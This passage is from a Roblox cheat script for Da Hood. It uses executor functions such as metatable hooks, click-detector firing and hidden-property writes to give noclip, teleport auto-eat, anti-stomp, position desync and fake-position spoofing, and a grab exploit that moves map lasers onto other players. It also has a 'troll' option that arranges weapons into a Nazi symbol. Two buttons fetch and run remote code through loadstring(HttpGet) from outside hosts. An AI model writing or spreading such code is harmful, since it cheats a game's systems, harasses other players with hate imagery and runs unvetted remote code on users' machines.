                            game:GetService("RunService"):BindToRenderStep("RestoreFireArmorPos", 199, function()
                                char.HumanoidRootPart.CFrame = savedPos
                                game:GetService("RunService"):UnbindFromRenderStep("RestoreFireArmorPos")
                                _G.busdhfnjsy7gjsy7d = false
                            end)
                        end
                    end
                end
            end))
        end
    end
})
_G.MiscSection:toggle({
    name = "auto eat",
    flag = "auto_armorrr",
    callback = function(v)
        _G.Features.AutoEat.Enabled = v
        if _G.Features.AutoEat.Conn then _G.Features.AutoEat.Conn:Disconnect() _G.Features.AutoEat.Conn = nil end
        if v then
            _G.Features.AutoEat.Conn = game:GetService("RunService").Heartbeat:Connect(LPH_JIT_MAX(function()
                if _G.busdhfnjsy7gjsy7d then return end
                local player = game:GetService("Players").LocalPlayer
                local char = player.Character
                local hum = char and char:FindFirstChildOfClass("Humanoid")
                if hum and hum.Health < 100 then
                    local food = char:FindFirstChild("[Taco]") or player.Backpack:FindFirstChild("[Taco]")
                    if food then
                        _G.busdhfnjsy7gjsy7d = true
                        food.Parent = char
                        food:Activate()
                        task.wait(0.1)
                        _G.busdhfnjsy7gjsy7d = false
                    else
                        local shopItem = nil
                        local shopParts = workspace.Ignored.Shop:GetChildren()
                        for i = 1, #shopParts do
                            local item = shopParts[i]
                            if item.Name:find("%[Taco%]") then
                                shopItem = item
                                break
                            end
                        end
                        
                        if shopItem and shopItem:FindFirstChild("Head") then
                            _G.busdhfnjsy7gjsy7d = true
                            local savedPos = char.HumanoidRootPart.CFrame
                            char.HumanoidRootPart.CFrame = shopItem.Head.CFrame
                            fireclickdetector(shopItem:FindFirstChildOfClass("ClickDetector"))
                            game:GetService("RunService"):BindToRenderStep("RestoreEatPos", 199, function()
                                char.HumanoidRootPart.CFrame = savedPos
                                game:GetService("RunService"):UnbindFromRenderStep("RestoreEatPos")
                                _G.busdhfnjsy7gjsy7d = false
                            end)
                        end
                    end
                elseif hum and hum.Health >= 100 then
                    local heldFood = char:FindFirstChild("[Taco]")
                    if heldFood then
                        heldFood.Parent = player.Backpack
                    end
                end
            end))
        end
    end
})
_G.KnockConn = nil
_G.WasKnocked = false
_G.StartAntiStomp = function()
    if _G.KnockConn then _G.KnockConn:Disconnect() end
    _G.KnockConn = game:GetService("RunService").Heartbeat:Connect(function()
        _G.Char = game:GetService("Players").LocalPlayer.Character
        _G.BodyEffects = _G.Char and _G.Char:FindFirstChild("BodyEffects")
        if _G.BodyEffects then
            _G.KO = _G.BodyEffects:FindFirstChild("K.O") or _G.BodyEffects:FindFirstChild("KO")
            if _G.KO and _G.KO.Value == true and not _G.WasKnocked then
                _G.WasKnocked = true
                _G.OldTime = game:GetService("Players").RespawnTime
                game:GetService("Players").RespawnTime = 0.1
                _G.Hum = _G.Char:FindFirstChildWhichIsA("Humanoid")
                if _G.Hum then _G.Hum:ChangeState(Enum.HumanoidStateType.Dead) end
                _G.Char:BreakJoints()
                task.delay(0.2, function()
                    game:GetService("Players").RespawnTime = _G.OldTime
                end)
            end
        end
    end)
end
game:GetService("Players").LocalPlayer.CharacterAdded:Connect(function()
    _G.WasKnocked = false
end)
_G.MiscSection:toggle({
    name = "anti stomp",
    flag = "anti_stomp",
    callback = function(v)
        if v then _G.StartAntiStomp()
        elseif _G.KnockConn then _G.KnockConn:Disconnect() end
    end
})
local _G_P = game:GetService("Players")
local _G_R = game:GetService("RunService")
local _G_L = _G_P.LocalPlayer
_G.MiscSection:toggle({
    name = "anti pepperspray",
    flag = "anti_pepper",
    callback = function(_G_v)
        if _G_v then
            _G.disngiugiuiusfnv = _G_R.RenderStepped:Connect(function()
                local _G_c = _G_L.Character
                if _G_c then
                    local _G_h = _G_c:FindFirstChildOfClass("Humanoid")
                    if _G_h then
                        local _G_t = _G_h:FindFirstChild("TrailEffects")
                        if _G_t then _G_t:Destroy() end
                    end
                end
                local _G_g = _G_L:FindFirstChild("PlayerGui")
                local _G_m = _G_g and _G_g:FindFirstChild("MainScreenGui")
                if _G_m then
                    for _, _G_o in pairs(_G_m:GetChildren()) do
                        if _G_o.Name == "PepperSpray" or _G_o.Name == "Blood" or _G_o.Name == "Action" then
                            _G_o.Visible = false
                            _G_o.Transparency = 1
                        end
                    end
                end
            end)
        else
            if _G.disngiugiuiusfnv then
                _G.disngiugiuiusfnv:Disconnect()
                _G.disngiugiuiusfnv = nil
            end
        end
    end
})
_G.MiscSection:toggle({
    name = "hide gun crosshair",
    flag = "RS_DF_BDS_BDSS_BD_BSD_BSDS_BVDSBV_DSVDSIEUHEVb4v",
    callback = function(v)
        _G.HideCrosshairEnabled = v
        if _G.HideCrosshairEnabled then
            _G.CrosshairOldMT = getrawmetatable(game)
            _G.CrosshairOldNewIndex = _G.CrosshairOldMT.__newindex
            _G.CrosshairFakeMT = {}
            for i, v in pairs(_G.CrosshairOldMT) do
                _G.CrosshairFakeMT[i] = v
            end
            _G.CrosshairFakeMT.__newindex = newcclosure(function(self, key, value)
                if not checkcaller() and _G.HideCrosshairEnabled and self == _G.CrosshairAimFrame and key == "Visible" then
                    return
                end
                return _G.CrosshairOldNewIndex(self, key, value)
            end)
            _G.GetCrosshairFrame = function()
                local player_gui = LocalPlayer:FindFirstChild("PlayerGui")
                if player_gui then
                    local main_gui = player_gui:WaitForChild("MainScreenGui", 5)
                    if main_gui then
                        _G.CrosshairAimFrame = main_gui:WaitForChild("Aim", 5)
                        if _G.CrosshairAimFrame then
                            setrawmetatable(_G.CrosshairAimFrame, _G.CrosshairFakeMT)
                            _G.CrosshairAimFrame.Visible = false
                        end
                    end
                end
            end
            if not _G.CrosshairCharConnection then
                _G.CrosshairCharConnection = LocalPlayer.CharacterAdded:Connect(function()
                    task.wait(1)
                    if _G.HideCrosshairEnabled then
                        _G.GetCrosshairFrame()
                    end
                end)
            end
            _G.GetCrosshairFrame()
        else
            if _G.CrosshairAimFrame then
                setrawmetatable(_G.CrosshairAimFrame, _G.CrosshairOldMT)
                _G.CrosshairAimFrame.Visible = true
            end
        end
    end
})
_G.MiscSection:toggle({
    name = "troll nazi sign",
    flag = "antfdgkjh",
    callback = function(v)
        _G.t_act = v
        if not v then
            local char = game.Players.LocalPlayer.Character
            if char then
                local kids = char:GetChildren()
                for i = 1, #kids do
                    if kids[i]:IsA("Tool") then
                        kids[i].Parent = game.Players.LocalPlayer:FindFirstChild("Backpack")
                    end
                end
            end
            return
        end

        _G.n_cfg = {
            { name = "[SledgeHammer]", count = 2, grips = { {Position = Vector3.new(0,-10,0), Rotation = Vector3.new(0,90,0)}, {Position = Vector3.new(0,0,-10), Rotation = Vector3.new(0,90,90)}}},
            { name = "[Bat]", count = 2, grips = { {Position = Vector3.new(5,-12.3,0), Rotation = Vector3.new(0,0,0)}, {Position = Vector3.new(5,7.7,0), Rotation = Vector3.new(0,0,180)}}},
            { name = "[Pitchfork]", count = 2, grips = { {Position = Vector3.new(0,-7.7,0), Rotation = Vector3.new(0,0,0)}, {Position = Vector3.new(0,12.4,0), Rotation = Vector3.new(0,0,180)}}},
            { name = "[Shovel]", count = 2, grips = { {Position = Vector3.new(0,-3,-10), Rotation = Vector3.new(0,90,90)}, {Position = Vector3.new(0,-3,10), Rotation = Vector3.new(0,90,-90)}}},
            { name = "[StopSign]", count = 2, grips = { {Position = Vector3.new(-3,-14.5,0), Rotation = Vector3.new(0,0,0)}, {Position = Vector3.new(-3,5.5,0), Rotation = Vector3.new(0,0,180)}}}
        }

        _G.gt_cnt = function(n)
            local c = 0
            local bp = game.Players.LocalPlayer:FindFirstChild("Backpack")
            local ch = game.Players.LocalPlayer.Character
            if bp then 
                local b_k = bp:GetChildren()
                for i = 1, #b_k do if b_k[i].Name == n then c = c + 1 end end 
            end
            if ch then 
                local c_k = ch:GetChildren()
                for i = 1, #c_k do if c_k[i].Name == n then c = c + 1 end end 
            end
            return c
        end

        _G.b_tl = LPH_NO_VIRTUALIZE(function(n)
            local ch = game.Players.LocalPlayer.Character or game.Players.LocalPlayer.CharacterAdded:Wait()
            local r = ch:WaitForChild("HumanoidRootPart", 5)
            if not r then return false end
            local tar = nil
            local des = workspace:GetDescendants()
            for i = 1, #des do
                local v = des[i]
                if string.find(v.Name, n, 1, true) then
                    if v:IsA("ClickDetector") or v:IsA("TouchTransmitter") then
                        tar = v.Parent break
                    elseif v:IsA("Model") and v:FindFirstChild("ClickDetector") then
                        tar = v break
                    end
                end
            end
            if tar then
                local p = tar:IsA("Model") and tar:GetModelCFrame() or tar.CFrame
                local old = r.CFrame
                r.CFrame = p + Vector3.new(0, 2, 0)
                task.wait(0.3)
                local cd = tar:FindFirstChildWhichIsA("ClickDetector") or (tar:IsA("ClickDetector") and tar)
                if cd then fireclickdetector(cd) else firetouchinterest(r, tar, 0) firetouchinterest(r, tar, 1) end
                task.wait(0.3)
                r.CFrame = old
                local s = tick()
                while tick() - s < 6 do
                    if not _G.t_act then return false end
                    local b = game.Players.LocalPlayer:FindFirstChild("Backpack")
                    if b and b:FindFirstChild(n) then
                        b[n].Parent = ch return true
                    end
                    game:GetService("RunService").Heartbeat:Wait()
                end
            end
            return false
        end)

        _G.p_tl_n = LPH_NO_VIRTUALIZE(function(n, g)
            local ch = game.Players.LocalPlayer.Character
            if not ch then return end
            local f = {}
            local k = ch:GetChildren()
            for i = 1, #k do
                if k[i].Name == n and k[i]:IsA("Tool") then table.insert(f, k[i]) end
            end
            for i = 1, #f do
                if g[i] then
                    local p, r = g[i].Position, g[i].Rotation
                    f[i].Grip = CFrame.new(p) * CFrame.Angles(math.rad(r.X), math.rad(r.Y), math.rad(r.Z))
                end
            end
        end)

        task.spawn(function()
            for i = 1, #_G.n_cfg do
                local d = _G.n_cfg[i]
                if not _G.t_act then break end
                local need = d.count - _G.gt_cnt(d.name)
                if need > 0 then
                    for j = 1, need do 
                        if not _G.t_act then break end
                        _G.b_tl(d.name)
                        task.wait(0.1)
                    end
                end
            end
            task.wait(0.5)
            if _G.t_act then
                for i = 1, #_G.n_cfg do
                    _G.p_tl_n(_G.n_cfg[i].name, _G.n_cfg[i].grips)
                end
            end
        end)
    end
})
_G.MiscSection:toggle({
    name = "anti seat",
    flag = "anti_seat",
    callback = function(v)
        _G.Features.AntiSeat.Enabled = v
        for i, s in ipairs(workspace:GetDescendants()) do
            if s:IsA("Seat") then
                s.Disabled = v
            end
        end
    end
})
_G.MiscSection:toggle({
    name = "chat spy",
    flag = "chat_spy",
    callback = function(v)
        _G.Features.ChatSpy.Enabled = v
        local TextChatService = game:GetService("TextChatService")
        if TextChatService.ChatWindowConfiguration then
            TextChatService.ChatWindowConfiguration.Enabled = v
        end
    end
})
_G.NoclipConn = nil
_G.MiscSection:toggle({
    name = "no clip",
    flag = "noclip",
    callback = function(v)
if _G.NoclipConn then _G.NoclipConn:Disconnect() end
if v then
    _G.NoclipConn = game:GetService("RunService").Stepped:Connect(LPH_NO_VIRTUALIZE(function()
        _G.Char = game:GetService("Players").LocalPlayer.Character
        if _G.Char then
            local descendants = _G.Char:GetDescendants()
            for i = 1, #descendants do
                local p = descendants[i]
                if p:IsA("BasePart") and p.CanCollide then 
                    p.CanCollide = false 
                end
            end
        end
    end))
end
    end
})
_G.JumpConn = nil
_G.MiscSection:toggle({
    name = "no jump cooldown",
    flag = "nojump_cooldown",
    callback = function(v)
        _G.Features.NoJumpCooldown.Enabled = v
        _G.FixJump = function(char)
            _G.Hum = char:WaitForChild("Humanoid")
            _G.Hum.UseJumpPower = not v
        end
        if game:GetService("Players").LocalPlayer.Character then _G.FixJump(game:GetService("Players").LocalPlayer.Character) end
        if _G.JumpConn then _G.JumpConn:Disconnect() end
        _G.JumpConn = game:GetService("Players").LocalPlayer.CharacterAdded:Connect(_G.FixJump)
    end
})
_G.voidconn = nil
_G.MiscSection:toggle({
    name = "anti void",
    flag = "anti_void",
    callback = function(v)
        if v then
            Workspace.FallenPartsDestroyHeight = 0 / 0
            _G.voidconn = Workspace:GetPropertyChangedSignal("FallenPartsDestroyHeight"):Connect(function()
                Workspace.FallenPartsDestroyHeight = 0 / 0
            end)
        else
            if _G.voidconn then
                _G.voidconn:Disconnect()
                _G.voidconn = nil
            end
            Workspace.FallenPartsDestroyHeight = -500
        end
    end
})
_G.MiscSection:button({
    name = "inf grab exploit (press for each grab)",
    callback = function()
for i,v in pairs(workspace.MAP.Indestructible.Lasers:GetChildren()) do
v.Size = Vector3.new(0.7,0.7,0.7)
v.Transparency = 1
v.CanCollide = false
end
repeat task.wait()
pcall(function()
    local grabbedName = tostring(game.Players.LocalPlayer.Character.BodyEffects.Grabbed.Value)
    local grabbedPlayer = game.Players:FindFirstChild(grabbedName)

    if grabbedPlayer and grabbedPlayer.Character and grabbedPlayer.Character:FindFirstChild("HumanoidRootPart") then
    for i,v in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
    if v:IsA("BasePart") then
    v.CanTouch = false
    v.CanQuery = false
    end
    end
        task.wait(0.2)
        local hrp = grabbedPlayer.Character.HumanoidRootPart
        for i,v in pairs(workspace.MAP.Indestructible.Lasers:GetChildren()) do
        v.CFrame = hrp.CFrame * CFrame.new(0, 4, 0)
        end
        task.wait(0.5)
        for i,v in pairs(workspace.MAP.Indestructible.Lasers:GetChildren()) do
        v.CFrame = hrp.CFrame * CFrame.new(0, 1, 0)
        end
    else
    for i,v in pairs(workspace.MAP.Indestructible.Lasers:GetChildren()) do
        v.Position = Vector3.new(0,0,0)
    end
    task.wait(0.1)
    for i,v in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
        if v:IsA("BasePart") then
            v.CanTouch = true
            v.CanQuery = true
        end
    end
    end
    end)
until not game.Players.LocalPlayer
    end
})
_G.MiscSection:button({
    name = "redeem all codes",
    callback = function()
        local success, html = pcall(function() 
            return game:HttpGet("https://gamerant.com/roblox-da-hood-codes/") 
        end)
        if not success then 
            library:notification({text = "failed to fetch codes", duration = 3})
            return 
        end
        local startPos = html:find("All Active Da Hood Codes")
        local endPos = html:find("All Expired Da Hood Codes")
        if startPos and endPos then
            local section = html:sub(startPos, endPos)
            local event = game:GetService("ReplicatedStorage"):WaitForChild("MainEvent")
            for code in section:gmatch("<strong>(.-)</strong>") do
                if not code:find("%(") and not code:find("Active") and #code > 1 then
                    local cleanCode = code:gsub("%s+$", "")
                    event:FireServer("EnterPromoCode", cleanCode)
                    library:notification({text = "attempted: " .. cleanCode, duration = 2})
                    task.wait(0.5)
                end
            end
        else
            library:notification({text = "could not find code section", duration = 3})
        end
    end
})
_G.MiscSection:button({
    name = "neckgrab tools",
    callback = function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/zesty-create/rescue/refs/heads/main/neckgrab.lua"))()
    end
})
_G.MiscSection:button({
    name = "autofarm dhc (permanent)",
    callback = function()
    loadstring(game:HttpGet("https://cdn.getsample.lol/96qyaapb"))()
    end
})
local desyncSection = Player:section({name = "desync", side = "right"})
getgenv().Melora = getgenv().Melora or { Network = { Desync = false, FakePos = false, UseSenderRate = true, SenderRate = 60, RefreshRate = 20 } }
getgenv().fpos = getgenv().fpos or { enabled = false, client_root = nil, saved_cframe = nil, hook = nil, timer = 0, is_elevated = false }
getgenv().csync = getgenv().csync or { enabled = false, selectedMode = "CLICK ME TO DISABLE DESYNC", mode = "Void Spam", client_root = nil, saved_cframe = nil, hook = nil, is_elevated = false, timer = 0, void_time = 0.4, normal_time = 0.133, dummy = nil, VisualizeEnabled = false, VisualizerColor = Color3.fromRGB(255,255,255), VisualizerSize = 1, VisualizerForm = "Dummy" }
getgenv().network = getgenv().network or { enabled = false, sleeping = false, keybind = Enum.KeyCode.X, velocity_enabled = false, Velocities = { Velocity = Vector3.new(0,0,0), AssemblyLinear = Vector3.new(0,0,0), Rot = Vector3.new(0,0,0) }, fake_pos = nil, fake_vel = Vector3.new(0,0,0), MaxVelocity = 16384 }
task.spawn(function()
    while true do
        local char = game.Players.LocalPlayer.Character
        if char and char:FindFirstChild("HumanoidRootPart") then
            local hrp = char.HumanoidRootPart
            getgenv().fpos.client_root = hrp
            getgenv().csync.client_root = hrp
            getgenv().network.client_root = hrp
        else
            getgenv().fpos.client_root = nil
            getgenv().csync.client_root = nil
            getgenv().network.client_root = nil
        end
        task.wait(1)
    end
end)

game.Players.LocalPlayer.CharacterAdded:Connect(function(char)
    local hrp = char:WaitForChild("HumanoidRootPart", 60)
    getgenv().csync.client_root = hrp
    getgenv().network.client_root = hrp
    getgenv().ensureDummy()
end)

game.Players.LocalPlayer.CharacterRemoving:Connect(function()
    getgenv().csync.client_root = nil
    getgenv().network.client_root = nil
end)

getgenv().fpos.enable_hook = function()
    if not getgenv().fpos.hook then
        local old
        old = hookmetamethod(game, "__index", LPH_JIT_MAX(function(self, index)
            if not checkcaller() and getgenv().fpos.enabled and getgenv().fpos.saved_cframe and index == "CFrame" and self == getgenv().fpos.client_root then
                return getgenv().fpos.saved_cframe
            end
            return old(self, index)
        end))
        getgenv().fpos.hook = old
    end
end

getgenv().fpos.disable_hook = function()
    if getgenv().fpos.hook then
        getgenv().fpos.hook = nil
    end
end

getgenv().fpos.getUndergroundCFrame = LPH_JIT_MAX(function()
    if getgenv().fpos.client_root then
        return CFrame.new(getgenv().fpos.client_root.Position.X, getgenv().fpos.client_root.Position.Y - 18, getgenv().fpos.client_root.Position.Z)
    end
    return CFrame.new()
end)

getgenv().enable_hook = function()
    if not getgenv().csync.hook then
        local old
        old = hookmetamethod(game, "__index", LPH_JIT_MAX(function(self, index)
            if not checkcaller() and getgenv().csync.enabled and getgenv().csync.saved_cframe and index == "CFrame" and self == getgenv().csync.client_root then
                return getgenv().csync.saved_cframe
            end
            return old(self, index)
        end))
        getgenv().csync.hook = old
    end
end

getgenv().disable_hook = function()
    if getgenv().csync.hook then
        getgenv().csync.hook = nil
    end
end

getgenv().createDummy = function()
    local r6_dummy = game:GetObjects("rbxassetid://9474737816")[1]
    if not r6_dummy then return nil end
    if r6_dummy:FindFirstChild("Head") and r6_dummy.Head:FindFirstChild("Face") then r6_dummy.Head.Face:Destroy() end
    local sz = getgenv().csync.VisualizerSize
    local col = getgenv().csync.VisualizerColor
    local mat = getgenv().csync.VisualizerMaterial or Enum.Material.Neon
    for _,v in ipairs(r6_dummy:GetChildren()) do
        if v:IsA("BasePart") then
            v.CanCollide = false
            v.Anchored = false
            v.Transparency = v.Name == "HumanoidRootPart" and 1 or 0.5
            v.Material = mat
            v.Color = col
            if v.Name ~= "HumanoidRootPart" then v.Size = Vector3.new(2,2,1) * sz end
        end
    end
    r6_dummy.PrimaryPart = r6_dummy:FindFirstChild("HumanoidRootPart")
    return r6_dummy
end

getgenv().ensureDummy = function()
    local cs = getgenv().csync
    if not cs.dummy or not cs.dummy.Parent then
        cs.dummy = getgenv().createDummy()
        if cs.dummy then
            local enabled = cs.VisualizeEnabled or (getgenv().fpos and getgenv().fpos.enabled) or (getgenv().network and getgenv().network.enabled)
            cs.dummy.Parent = enabled and workspace or nil
        end
    end
end

getgenv().updateDummy = LPH_JIT_MAX(function()
    local cs = getgenv().csync
    local root = cs.client_root or getgenv().network.client_root or getgenv().fpos.client_root
    if not root then return end
    getgenv().ensureDummy()
    local dummy = cs.dummy
    if not dummy or not dummy.PrimaryPart then return end
    local target_cframe
    if getgenv().network.velocity_enabled and getgenv().network.fake_pos then
        target_cframe = CFrame.new(getgenv().network.fake_pos)
    elseif getgenv().network.enabled and getgenv().fpos.client_root then
        target_cframe = getgenv().fpos.client_root.CFrame
    elseif getgenv().fpos.enabled then
        target_cframe = getgenv().fpos.getUndergroundCFrame()
    else
        target_cframe = getgenv().getDummyCFrame()
    end
    if dummy.PrimaryPart then
        pcall(function() dummy:SetPrimaryPartCFrame(target_cframe) end)
    end
    if (cs.VisualizeEnabled or getgenv().fpos.enabled or getgenv().network.enabled) and not dummy.Parent then
        dummy.Parent = workspace
    end
end)

getgenv().getDummyCFrame = LPH_JIT_MAX(function()
    local root = getgenv().csync.client_root
    if not root then return CFrame.new() end
    if getgenv().csync.mode == "Void Spam" then
        return getgenv().csync.is_elevated and CFrame.new(root.Position.X, math.random(1e6,2e6), root.Position.Z) or root.CFrame
    elseif getgenv().csync.mode == "Void" then
        return CFrame.new(root.Position.X + math.random(-444444,444444), root.Position.Y + math.random(-444444,444444), root.Position.Z + math.random(-44444,44444))
    else
        return root.CFrame
    end
end)
getgenv().csync.VisualizerColor = Color3.fromRGB(255, 136, 0)
getgenv().csync.VisualizerSize = 1
getgenv().csync.VisualizerMaterial = Enum.Material.Neon
desyncSection:toggle({
    name = "visualizer",
    flag = "CSyncVisualize",
    default = false,
    callback = function(Value)
        getgenv().csync.VisualizeEnabled = Value
        getgenv().updateDummy()
    end
})
desyncSection:colorpicker({
    flag = "VisualizerColorPicker",
    color = getgenv().csync.VisualizerColor,
    callback = function(Value)
        getgenv().csync.VisualizerColor = Value
        local dummy = getgenv().csync.dummy
        if dummy then
            for _, v in ipairs(dummy:GetChildren()) do
                if v:IsA("BasePart") and v.Name ~= "HumanoidRootPart" then
                    v.Color = Value
                end
            end
        end
    end
})
desyncSection:dropdown({
    name = "visualizer material",
    flag = "vis_material",
    items = {"Neon", "SmoothPlastic", "Concrete", "Brick", "ForceField"},
    default = "Neon",
    multi = false,
    callback = function(Value)
        local mat = Enum.Material[Value]
        getgenv().csync.VisualizerMaterial = mat
        local dummy = getgenv().csync.dummy
        if dummy then
            for _, v in ipairs(dummy:GetChildren()) do
                if v:IsA("BasePart") and v.Name ~= "HumanoidRootPart" then
                    v.Material = mat
                end
            end
        end
    end
})
RunService.RenderStepped:Connect(function()
    if getgenv().csync.VisualizeEnabled then
        getgenv().updateDummy()
    end
end)
local name66666 = identifyexecutor() 
if name66666:find("Velocity") then
    local toggleEnabled = false
    local keybindActive = false
    local function updateDesync()
        if toggleEnabled and keybindActive then
            Raknet.desync(true)
            library:notification({text = "fake position enabled"})
        else
            Raknet.desync(false)
            library:notification({text = "fake position disabled"})
        end
    end
    desyncSection:toggle({
        name = "fake position",
        flag = "posswitch",
        default = false,
        callback = function(Value)
            toggleEnabled = Value
            updateDesync()
        end
    })
    desyncSection:keybind({
        flags = "fakapas",
        default = nil,
        callback = function(state)
            keybindActive = state
            updateDesync()
        end
    })
end
desyncSection:toggle({
    name = "underground invisible (can shoot)",
    flag = "FakePosInvisible",
    default = false,
    callback = function(Value)
        local root = getgenv().fpos.client_root
        getgenv().fpos.enabled = Value
        getgenv().updateDummy()
        if Value then
            getgenv().fpos.enable_hook()
        else
            if root and getgenv().fpos.saved_cframe then
                root.CFrame = getgenv().fpos.saved_cframe
            end
            getgenv().fpos.disable_hook()
            getgenv().fpos.saved_cframe = nil
            getgenv().fpos.is_elevated = false
        end
    end
})
desyncSection:keybind({
    flags = "uginvs",
    default = nil,
    callback = function(state)
        getgenv().fpos.enabled = not getgenv().fpos.enabled
        getgenv().updateDummy()
    end
})
desyncSection:toggle({
    name = "void desync",
    flag = "uytrrntyuntruntr",
    default = false,
    callback = function(Value)
        getgenv().csync.selectedMode = Value and "Void" or "CLICK ME TO DISABLE DESYNC"
    end
})
desyncSection:keybind({
    flags = "ugiggggnvs",
    default = nil,
    callback = function(state)
        local current = getgenv().csync.selectedMode == "Void"
        getgenv().csync.selectedMode = (not current) and "Void" or "CLICK ME TO DISABLE DESYNC"
    end
})
game:GetService("RunService").Heartbeat:Connect(LPH_JIT_MAX(function(delta)
    local root = getgenv().fpos.client_root
    if not root then return end
    if getgenv().fpos.enabled then
        if not getgenv().fpos.hook then getgenv().fpos.enable_hook() end
        getgenv().fpos.timer = getgenv().fpos.timer + delta
        if getgenv().fpos.timer >= 0.133 then
            getgenv().fpos.timer = 0
            getgenv().fpos.is_elevated = not getgenv().fpos.is_elevated
        end
        local random_rotation = CFrame.Angles(math.rad(math.random(-180,180)), math.rad(math.random(-180,180)), math.rad(math.random(-180,180)))
        local target_cframe = getgenv().fpos.getUndergroundCFrame() * random_rotation
        getgenv().fpos.saved_cframe = root.CFrame
        root.CFrame = target_cframe
        game:GetService("RunService").RenderStepped:Wait()
        root.CFrame = getgenv().fpos.saved_cframe
    end
end))

game:GetService("RunService").RenderStepped:Connect(LPH_JIT_MAX(function()
    if getgenv().csync.VisualizeEnabled or getgenv().fpos.enabled or getgenv().network.velocity_enabled or getgenv().network.enabled then
        getgenv().updateDummy()
    elseif getgenv().csync.dummy and getgenv().csync.dummy.Parent then
        getgenv().csync.dummy.Parent = nil
    end
end))

game:GetService("RunService").Heartbeat:Connect(LPH_JIT_MAX(function(delta)
    local root = getgenv().csync.client_root
    if not root then return end
    local wasEnabled = getgenv().csync.enabled
    getgenv().csync.enabled = getgenv().csync.selectedMode ~= "CLICK ME TO DISABLE DESYNC"
    getgenv().csync.mode = getgenv().csync.selectedMode
    if getgenv().csync.enabled then
        if not wasEnabled then getgenv().enable_hook() end
        getgenv().csync.timer = getgenv().csync.timer + delta
        local threshold = getgenv().csync.is_elevated and getgenv().csync.void_time or getgenv().csync.normal_time
        if getgenv().csync.timer >= threshold then
            getgenv().csync.timer = 0
            getgenv().csync.is_elevated = not getgenv().csync.is_elevated
        end
        local random_rotation = CFrame.Angles(math.rad(math.random(-180,180)), math.rad(math.random(-180,180)), math.rad(math.random(-180,180)))
        local target_cframe = getgenv().getDummyCFrame() * random_rotation
        getgenv().csync.saved_cframe = root.CFrame
        root.CFrame = target_cframe
        game:GetService("RunService").RenderStepped:Wait()
        root.CFrame = getgenv().csync.saved_cframe
    elseif wasEnabled then
        if getgenv().csync.hook then getgenv().disable_hook() end
        getgenv().csync.saved_cframe = nil
        getgenv().csync.is_elevated = false
    end
end))
game:GetService("RunService").PostSimulation:Connect(LPH_JIT_MAX(function()
    if getgenv().network.enabled and getgenv().fpos.client_root then
        getgenv().network.sleeping = not getgenv().network.sleeping
        sethiddenproperty(getgenv().fpos.client_root, "NetworkIsSleeping", getgenv().network.sleeping)
    end
end))
desyncSection:toggle({
    name = "void spam",
    flag = "uhjh65hkg",
    default = false,
    callback = function(Value)
        getgenv().csync.selectedMode = Value and "Void Spam" or "CLICK ME TO DISABLE DESYNC"
    end
})
desyncSection:keybind({
    flags = "ughjjkreggh",
    default = nil,
    callback = function()
        local current = getgenv().csync.selectedMode == "Void Spam"
        getgenv().csync.selectedMode = (not current) and "Void Spam" or "CLICK ME TO DISABLE DESYNC"
    end
})

desyncSection:slider({
    name = "in void",
    flag = "dfdgehrt6hn",
    default = 0.4,
    min = 0,
    max = 1,
    interval = 0.001,
    callback = function(Value)
        getgenv().csync.void_time = Value
    end
})
desyncSection:slider({
    name = "out of void",
    flag = "dfdgehrhhhhht6hn",
    default = 0.133,
    min = 0,
    max = 1,
    interval = 0.001,
    callback = function(Value)
        getgenv().csync.normal_time = Value
    end
})

_G.Emotes = {Enabled = false, CurrentAnimation = nil, DefaultAnim = "rbxassetid://5917459365", Anims = {kickinglegs = 120370790028350, spongebobdance = 18443245017, teleport = 104767795538635, crossed = 128386160365167, imagination = 18443237526, yungblud = 15609995579, laugh = 3337966527, floss = 5917459365, sleep = 4686925579, hype = 3695333486, sad = 4841407203, goofyhands = 14496531574, heyyamove = 119734573196374, animeah = 78982325370329, invisibleme = 126995783634131, strangerthings = 70692992882447, tornado = 135373056067761, jabbaswitchway = 77791964179635, invisibleme2 = 112119483472206}}
_G.PlayEmote = function(name, speed)
    speed = tonumber(speed) or 1
    _G.Char = game:GetService("Players").LocalPlayer.Character or game:GetService("Players").LocalPlayer.CharacterAdded:Wait()
    _G.Hum = _G.Char:WaitForChild("Humanoid", 5)
    if not _G.Hum then return end
    _G.Animator = _G.Hum:FindFirstChildOfClass("Animator")
    if not _G.Animator then return end
    if _G.Emotes.CurrentAnimation then
        pcall(function() _G.Emotes.CurrentAnimation:Stop() end)
        _G.Emotes.CurrentAnimation = nil
    end
    _G.Id = _G.Emotes.Anims[name]
    if not _G.Id then return end
    _G.Anim = Instance.new("Animation")
    _G.Anim.AnimationId = "rbxassetid://" .. tostring(_G.Id)
    _G.Track = _G.Animator:LoadAnimation(_G.Anim)
    _G.Track.Priority = Enum.AnimationPriority.Action4
    _G.Track.Looped = true
    _G.Track:Play()
    _G.Track:AdjustSpeed(speed)
    _G.Emotes.CurrentAnimation = _G.Track
end
_G.StopEmote = function()
    if _G.Emotes.CurrentAnimation then
        pcall(function() _G.Emotes.CurrentAnimation:Stop() end)
        _G.Emotes.CurrentAnimation = nil
    end
end
_G.EmotesGUI = Player:section({name = "emotes", side = "right"})
_G.EmotesGUI:toggle({
    name = "enabled",
    flag = "emotes_enabled",
    default = false,
    callback = function(v)
        _G.Emotes.Enabled = v
        if not v then _G.StopEmote() return end
        _G.Sel = library.flags["emotes_select"]
        _G.Spd = (library.flags["emotes_speed"] or 10) / 10
        _G.PlayEmote(_G.Sel, _G.Spd > 0 and _G.Spd or 1)
    end
})
_G.EmotesGUI:dropdown({
    name = "selected emote",
    flag = "emotes_select",
    items = {"kickinglegs","heyyamove","animeah","spongebobdance","crossed","invisibleme","imagination","yungblud","strangerthings","laugh","floss","sleep","hype","sad","goofyhands", "tornado", "jabbaswitchway"},
    callback = function(v)
        if _G.Emotes.Enabled then
            _G.Spd = (library.flags["emotes_speed"] or 10) / 10
            _G.PlayEmote(v, _G.Spd > 0 and _G.Spd or 1)
        end
    end
})
_G.EmotesGUI:slider({
    name = "emote speed",
    flag = "emotes_speed",
    min = 0,
    max = 100,
    default = 10,
    callback = function(v)
        if _G.Emotes.Enabled and _G.Emotes.CurrentAnimation then
            _G.Emotes.CurrentAnimation:AdjustSpeed(v / 10)
        end
    end
})
game:GetService("Players").LocalPlayer.CharacterAdded:Connect(function()
    task.wait(2)
    if _G.Emotes.Enabled then
        _G.Sel = library.flags["emotes_select"]
        _G.Spd = (library.flags["emotes_speed"] or 10) / 10
